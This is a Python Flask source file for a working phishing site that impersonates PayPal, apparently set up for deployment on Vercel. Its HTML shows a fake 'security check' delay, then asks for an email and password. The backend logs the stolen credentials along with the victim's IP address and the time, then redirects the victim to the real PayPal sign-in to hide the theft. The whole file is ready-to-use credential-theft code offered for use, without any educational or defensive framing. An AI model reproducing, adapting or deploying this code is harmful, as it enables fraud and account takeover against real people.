from flask import Flask, render_template_string, request, redirect
import datetime

app = Flask(__name__)

# --- THE FRONTEND (HTML/CSS) ---
# We use a single string to keep it simple for your deployment.
HTML_CONTENT = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal | Secure Verification</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
        h2 { color: #2c2e2d; margin-bottom: 10px; }
        p { color: #6c7378; font-size: 14px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #0070ba; color: white; border: none; border-radius: 25px; cursor: pointer; font-weight: bold; margin-top: 15px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0070ba; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #form-container { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.paypalobjects.com/webstatic/m/v/c/logo-typesmallest.png" width="100" alt="PayPal">
        <div id="loading-state">
            <h2>Security Check</h2>
            <p>Verifying your session...</p>
            <div class="loader"></div>
        </div>

        <div id="form-container">
            <h2>Account Verification</h2>
            <p>To prevent unauthorized access, please re-authenticate your account.</p>
            <form action="/api/index" method="POST">
                <input type="email" name="email" placeholder="Email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Verify & Continue</button>
            </form>
        </div>
    </div>

    <script>
        // Simulates a delay to make the "security check" look real
        setTimeout(() => {
            document.getElementById('loading-state').style.display = 'none';
            document.getElementById('form-container').style.display = 'block';
        }, 2500);
    </script>
</body>
</html>
"""

# --- THE BACKEND (Python Logic) ---

@app.route('/')
@app.route('/api/index', methods=['GET', 'POST'])
def index():
    # 1. Handle the GET request (Loading the page)
    if request.method == 'GET':
        return render_template_string(HTML_CONTENT)
    
    # 2. Handle the POST request (Capturing the data)
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        ip = request.remote_addr
        time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # IMPORTANT: On Vercel, we print to the console to see the data
        print("\n" + "!"*30)
        print(f"[*] ALERT: DATA CAPTURED")
        print(f"[*] TIME: {time}")
        print(f"[*] IP: {ip}")
        print(f"[*] EMAIL: {email}")
        print(f"[*] PASSWORD: {password}")
        print("!"*30 + "\n")

        # Redirect to the real PayPal to hide the trace
        return redirect("https://www.paypal.com/signin")

    return "Method Not Allowed", 405

# Required for Vercel deployment
app = app